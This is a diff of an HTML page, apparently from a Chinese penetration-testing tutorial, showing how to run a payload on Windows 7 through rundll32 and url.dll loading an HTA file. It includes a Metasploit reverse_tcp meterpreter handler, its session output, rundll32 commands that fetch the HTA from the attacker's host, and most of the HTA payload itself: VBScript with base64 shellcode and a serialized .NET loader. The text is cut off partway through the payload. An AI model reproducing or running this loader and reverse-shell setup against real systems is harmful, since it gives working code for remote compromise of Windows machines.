@@ -21,7 +21,7 @@
                 
             
                 
-                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-prism/prism-darcula.css">
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-prism/prism-atom-dark.css">
                 
             
                 
@@ -46,6 +46,10 @@
             
                 
                 <link rel="stylesheet" href="../../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-terminal/plugin.css">
                 
             
                 
@@ -1896,14 +1900,14 @@ C:\Windows\SysWOW64\url.dll
 </code></pre>
 <p><strong>&#x653B;&#x51FB;&#x673A;&#xFF1A;</strong> 192.168.1.4 Debian<br><strong>&#x9776;&#x673A;&#xFF1A;</strong> 192.168.1.3 Windows 7</p>
 <h3 id="&#x914D;&#x7F6E;&#x653B;&#x51FB;&#x673A;msf&#xFF1A;"><a name="&#x914D;&#x7F6E;&#x653B;&#x51FB;&#x673A;msf&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x914D;&#x7F6E;&#x653B;&#x51FB;&#x673A;msf&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x914D;&#x7F6E;&#x653B;&#x51FB;&#x673A;msf&#xFF1A;" class="plugin-anchor" href="#&#x914D;&#x7F6E;&#x653B;&#x51FB;&#x673A;msf&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x914D;&#x7F6E;&#x653B;&#x51FB;&#x673A;msf&#xFF1A;</h3>
-<pre class="language-"><code class="lang-bash">msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 
+<pre class="language-"><code class="lang-bash">msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options
 
-Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>: 
+Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:
 
 Name Current Setting Required Description
-&#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010; 
+&#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;
 
-Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_tcp<span class="token punctuation">)</span>: 
+Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_tcp<span class="token punctuation">)</span>:
 
 Name Current Setting Required Description
 &#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;
@@ -1911,15 +1915,15 @@ EXITFUNC process <span class="token function">yes</span> Exit technique <span cl
 
 LHOST 192.168.1.4 <span class="token function">yes</span> The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
 
-LPORT 53 <span class="token function">yes</span> The listen port 
+LPORT 53 <span class="token function">yes</span> The listen port
 
-Exploit target: 
+Exploit target:
 
 Id Name
 &#x2010;&#x2010; &#x2010;&#x2010;&#x2010;&#x2010;
-0 Wildcard Target 
+0 Wildcard Target
 
-msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 
+msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit
 
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.168.1.4:53
 </code></pre>
@@ -1927,7 +1931,7 @@ msf exploit<span class="token punctuation">(</span>multi/handler<span class="tok
 <h3 id="&#x9776;&#x673A;&#x6267;&#x884C;&#xFF1A;"><a name="&#x9776;&#x673A;&#x6267;&#x884C;&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x9776;&#x673A;&#x6267;&#x884C;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x9776;&#x673A;&#x6267;&#x884C;&#xFF1A;" class="plugin-anchor" href="#&#x9776;&#x673A;&#x6267;&#x884C;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x9776;&#x673A;&#x6267;&#x884C;&#xFF1A;</h3>
 <pre class="language-"><code class="lang-bash">rundll32.exe url.dll,FileProtocolHandler file://C:\Users\John\Desktop\Micropoor_url_dll.hta
 </code></pre>
-<pre class="language-"><code class="lang-bash">msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 
+<pre class="language-"><code class="lang-bash">msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit
 
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.168.1.4:53
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>179779 bytes<span class="token punctuation">)</span> to 192.168.1.3
@@ -1944,221 +1948,214 @@ Current pid: 8584
 <pre class="language-"><code class="lang-bash">rundll32.exe url.dll,OpenURL http://192.168.1.4/Micropoor_url_dll.hta
 </code></pre>
 <h3 id="&#x9644;&#x5F55;&#xFF1A;micropoorurldllhta"><a name="&#x9644;&#x5F55;&#xFF1A;micropoorurldllhta" class="anchor-navigation-ex-anchor" href="#&#x9644;&#x5F55;&#xFF1A;micropoorurldllhta"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x9644;&#x5F55;&#xFF1A;micropoorurldllhta" class="plugin-anchor" href="#&#x9644;&#x5F55;&#xFF1A;micropoorurldllhta"><i class="fa fa-link" aria-hidden="true"></i></a>&#x9644;&#x5F55;&#xFF1A;Micropoor_url_dll.hta</h3>
-<pre class="language-"><code class="lang-visual-basic"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">&quot;VBScript&quot;</span><span class="token operator">&gt;</span> 
+<p>```visual basic</p>
+<script language="VBScript">
 
-<span class="token keyword">Dim</span> binary <span class="token punctuation">:</span> binary <span class="token operator">=</span> <span class="token string">&quot;rundll32.exe&quot;</span> 
-
-<span class="token keyword">Dim</span> code <span class="token punctuation">:</span> code <span class="token operator">=</span> <span class="token string">&quot;/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMH
+<p>Dim binary : binary = &quot;rundll32.exe&quot;</p>
+<p>Dim code : code = &quot;/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMH
 PDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7
 fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfV
 GhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqAEEaAIAADWJ5lBQUFBAUEBQaOoP3+D/1Z
 dqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmo
 AaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8M
-JA+FcP///+mb////AcMpxnXBw7vwtaJWagBT/9U=&quot;</span>
-
-<span class="token keyword">Sub</span> Debug<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
-<span class="token keyword">End</span> <span class="token keyword">Sub</span>
-<span class="token keyword">Sub</span> SetVersion
-<span class="token keyword">End</span> <span class="token keyword">Sub</span>
-<span class="token keyword">Function</span> Base64ToStream<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
-<span class="token keyword">Dim</span> enc<span class="token punctuation">,</span> length<span class="token punctuation">,</span> ba<span class="token punctuation">,</span> transform<span class="token punctuation">,</span> ms
-<span class="token keyword">Set</span> enc <span class="token operator">=</span> CreateObject<span class="token punctuation">(</span><span class="token string">&quot;System.Text.ASCIIEncoding&quot;</span><span class="token punctuation">)</span>
-length <span class="token operator">=</span> enc<span class="token punctuation">.</span>GetByteCount_2<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
-<span class="token keyword">Set</span> transform <span class="token operator">=</span> CreateObject<span class="token punctuation">(</span><span class="token string">&quot;System.Security.Cryptography.FromBase64Transform&quot;</span><span class="token punctuation">)</span>
-<span class="token keyword">Set</span> ms <span class="token operator">=</span> CreateObject<span class="token punctuation">(</span><span class="token string">&quot;System.IO.MemoryStream&quot;</span><span class="token punctuation">)</span>
-ms<span class="token punctuation">.</span>Write transform<span class="token punctuation">.</span>TransformFinalBlock<span class="token punctuation">(</span>enc<span class="token punctuation">.</span>GetBytes_4<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>length <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>
-ms<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span>
-<span class="token keyword">Set</span> Base64ToStream <span class="token operator">=</span> ms
-<span class="token keyword">End</span> <span class="token keyword">Function</span>
-<span class="token keyword">Sub</span> Run
-
-<span class="token keyword">Dim</span> s<span class="token punctuation">,</span> entry_class
-
-s <span class="token operator">=</span> <span class="token string">&quot;AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ZW1ibHkGFwAAAARMb2FkCg8MAAAAAB4AAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAkNhXWQAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAA4AAiIAsBMAAAFgAAAAYAAAAAAAByNQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAIDUA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AE8AAAAAQAAAkAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAALnRleHQAAAB4FQAAACAAAAAWAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAkAMAAABA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAABAAAABgAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAcAAAAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAFQ1AAAAAAAASAAAAAIABQD4IQAAKBMAAAEAAAAAAAAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgIoDwAACioT&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;MAoABwEAAAEAABEEKBAAAAoKEgEGjmkoEQAACnMJAAAGDAgWfTUAAARyAQAAcBMEcgMAAHAoEgAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;Cm8TAAAKFjEZch0AAHAoEgAACnIrAABwAygUAAAKEwQrF3IdAABwKBIAAApyQQAAcAMoFAAAChME&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;EQQUFBQXGn4VAAAKFAgSAygBAAAGJgl7BAAABBMFEgUoFgAACnJXAABwKBcAAAosbhEFFnMRAAAK&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ByAAMAAAH0AoAgAABhMGEgYoFgAACnJXAABwKBgAAAosChEFFigEAAAGJioWEwcSCAaOaSgRAAAK&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;EQURBgYRCBEHKAMAAAYmEQUWcxEAAAoWEQYWcxEAAAoWFnMRAAAKKAUAAAYmKnoCfhUAAAp9AgAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;BAIoDwAACgICKBkAAAp9AQAABCoAABMwAgBgAAAAAAAAAAJ+FQAACn0rAAAEAn4VAAAKfSwAAAQC&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;fhUAAAp9LQAABAJ+FQAACn04AAAEAn4VAAAKfTkAAAQCfhUAAAp9OgAABAJ+FQAACn07AAAEAigP&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAKAgIoGQAACn0qAAAEKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAACgHAAAj&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;fgAAlAcAAEwJAAAjU3RyaW5ncwAAAADgEAAAXAAAACNVUwA8EQAAEAAAACNHVUlEAAAATBEAANwB&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAAjQmxvYgAAAAAAAAACAAABVx0CFAkCAAAA+gEzABYAAAEAAAAXAAAACQAAAFAAAAAJAAAAHwAA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ABkAAAAzAAAAEgAAAAEAAAABAAAABQAAAAEAAAABAAAABwAAAAAAmQYBAAAAAAAGAFwFkgcGAMkF&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;kgcGAIoEYAcPALIHAAAGALIE4QYGADAF4QYGABEF4QYGALAF4QYGAHwF4QYGAJUF4QYGAMkE4QYG&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AJ4EcwcGAHwEcwcGAPQE4QYGAKsIqQYGAGEEqQYGAE0FqQYGALAGqQYGAMoIqQYGAFkHqQYGAL4I&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;qQYGAGYGqQYGAIQGcwcAAAAAJQAAAAAAAQABAAEAEABtBgAAPQABAAEACgAQAPgHAAA9AAEACAAK&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ARAAzgYAAEEABAAJAAIBAAAbCAAASQAIAAkAAgEAADYIAABJACcACQAKABAABgcAAD0AKgAJAAIB&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AABtBAAASQA8AAoAAgEAAPMGAABJAEUACgAGAH0G+gAGAEQHPwAGACQE/QAGAHQIPwAGAOcDPwAG&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AMgD+gAGAL0D+gAGBp4DAAFWgLICAwFWgMACAwFWgGQAAwFWgIgCAwFWgMIAAwFWgFMCAwFWgPEB&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AwFWgB0CAwFWgAUCAwFWgKABAwFWgAIDAwFWgF4BAwFWgEgBAwFWgOEBAwFWgE0CAwFWgDECAwFW&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;gGoDAwFWgIIDAwFWgJkCAwFWgB0DAwFWgHYBAwFWgHUAAwFWgD0AAwFWgCcBAwFWgKgAAwFWgDoD&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AwFWgLkBAwFWgBgBAwFWgMYBAwFWgOUCAwEGBp4DAAFWgJEABwFWgHICBwEGAKYD+gAGAO8DPwAG&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ABcHPwAGADMEPwAGAEsD+gAGAJoD+gAGAOcF+gAGAO8F+gAGAEcI+gAGAFUI+gAGAOQE+gAGAC4I&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;+gAGAOcICwEGAA0ACwEGABkAPwAGANIIPwAGANwIPwAGADQHPwAGBp4DAAFWgN4CDgFWgO8ADgFW&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;gJ0BDgFWgNgCDgFWgNUBDgFWgA8BDgFWgJQBDgFWgAMBDgEGBp4DAAFWgOcAEgFWgFcAEgFWgNUA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;EgFWgFgDEgFWgGkCEgFWgE8DEgFWgN0AEgFWgGADEgFWgBEGEgFWgCQGEgFWgDkGEgEAAAAAgACW&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;IC4AFgEBAAAAAACAAJYg8wgqAQsAAAAAAIAAliAJCTUBEAAAAAAAgACWIGMIPwEVAAAAAACAAJEg&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;1ANFARcAUCAAAAAAhhg+BwYAHgBYIAAAAACGAE0EUAEeAGshAAAAAIYYPgcGACAAjCEAAAAAhhg+&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;BwYAIAAAAAEAOwQAAAIAUwQAAAMA5AcAAAQA0QcAAAUAwQcAAAYACwgAAAcAvAgAAAgAHAkBAAkA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;BAcCAAoAzAYAAAEAGwQAAAIAiwgAAAMAAwYAAAQAawQAAAUAsggAAAEAdAgAAAIAfQgAAAMAIQcA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAQAAwYAAAUAtQYAAAEAdAgAAAIA+gMAAAEAdAgAAAIA0QcAAAMA9wUAAAQAlQgAAAUAKAcAAAYA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;CwgAAAcAsgMAAAEAAgkAAAIAAQAJAD4HAQARAD4HBgAZAD4HCgApAD4HEAAxAD4HEAA5AD4HEABB&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AD4HEABJAD4HEABRAD4HEABZAD4HEABhAD4HFQBpAD4HEABxAD4HEACJAD4HBgB5AD4HBgCZAFMG&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;KQChAD4HAQCpAAQELwCxAHkGNACxAKQIOAChABIHPwChAGQGQgCxADsJRgCxAC8JRgC5AAoGTAAJ&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ACQAWgAJACgAXwAJACwAZAAJADAAaQAJADQAbgAJADgAcwAJADwAeAAJAEAAfQAJAEQAggAJAEgA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;hwAJAEwAjAAJAFAAkQAJAFQAlgAJAFgAmwAJAFwAoAAJAGAApQAJAGQAqgAJAGgArwAJAGwAtAAJ&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AHAAuQAJAHQAvgAJAHgAwwAJAHwAyAAJAIAAzQAJAIQA0gAJAIgA1wAJAIwA3AAJAJAA4QAJAJQA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;5gAJAJgA6wAJAKAAWgAJAKQAXwAJAPQAlgAJAPgAmwAJAPwA8AAJAAABuQAJAAQB4QAJAAgB9QAJ&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AAwBvgAJABABwwAJABgBbgAJABwBcwAJACABeAAJACQBfQAJACgBWgAJACwBXwAJADABZAAJADQB&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;aQAJADgBggAJADwBhwAJAEABjAAuAAsAVgEuABMAXwEuABsAfgEuACMAhwEuACsAhwEuADMAmAEu&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;ADsAmAEuAEMAhwEuAEsAhwEuAFMAmAEuAFsAngEuAGMApAEuAGsAzgFDAFsAngGjAHMAWgDDAHMA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;WgADAXMAWgAjAXMAWgAaAIwGAAEDAC4AAQAAAQUA8wgBAAABBwAJCQEAAAEJAGMIAQAAAQsA1AMB&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AASAAAABAAAAAAAAAAAAAAAAAPcAAAACAAAAAAAAAAAAAABRAKkDAAAAAAMAAgAEAAIABQACAAYA&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;AgAHAAIACAACAAkAAgAAAAAAAHNoZWxsY29kZTMyAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyADxN&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;b2R1bGU+AENyZWF0ZVByb2Nlc3NBAENSRUFURV9CUkVBS0FXQVlfRlJPTV9KT0IARVhFQ1VURV9S&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;RUFEAENSRUFURV9TVVNQRU5ERUQAUFJPQ0VTU19NT0RFX0JBQ0tHUk9VTkRfRU5EAERVUExJQ0FU&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;RV9DTE9TRV9TT1VSQ0UAQ1JFQVRFX0RFRkFVTFRfRVJST1JfTU9ERQBDUkVBVEVfTkVXX0NPTlNP&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;TEUARVhFQ1VURV9SRUFEV1JJVEUARVhFQ1VURQBSRVNFUlZFAENBQ1RVU1RPUkNIAFdSSVRFX1dB&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;VENIAFBIWVNJQ0FMAFBST0ZJTEVfS0VSTkVMAENSRUFURV9QUkVTRVJWRV9DT0RFX0FVVEhaX0xF&quot;</span>
-s <span class="token operator">=</span> s <span class="token operator">&amp;</span> <span class="token string">&quot;VkVMAENSRUFURV9TSEFSRURfV09XX1ZETQBDUkVBVEVfU0VQQVJBVEVfV09XX1ZETQBQUk9DRVNT&quot;</span>
